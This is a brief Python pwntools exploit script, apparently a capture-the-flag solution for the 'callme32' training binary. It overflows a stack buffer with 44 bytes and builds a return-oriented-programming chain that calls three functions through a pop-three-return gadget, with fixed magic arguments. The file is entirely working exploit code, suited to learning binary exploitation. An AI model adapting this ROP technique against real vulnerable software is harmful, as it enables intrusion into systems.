from pwn import *
elf = context.binary = ELF("./callme32")
p = process()

overwrite = b"A"*44

callme1 = p32(0x080484f0)
callme2 = p32(0x08048550)
callme3 = p32(0x080484e0)

pop3ret = p32(0x080487f9)

deadbeef = p32(0xdeadbeef)
cafebabe = p32(0xcafebabe)
doodfood = p32(0x0d00df00d)

arguments = deadbeef + cafebabe + doodfood

payload = overwrite + callme1 + pop3ret + arguments
payload += callme2 + pop3ret + arguments
payload += callme3 + pop3ret + arguments

p.sendline(payload)
write("payload",payload)
print(p.recvall())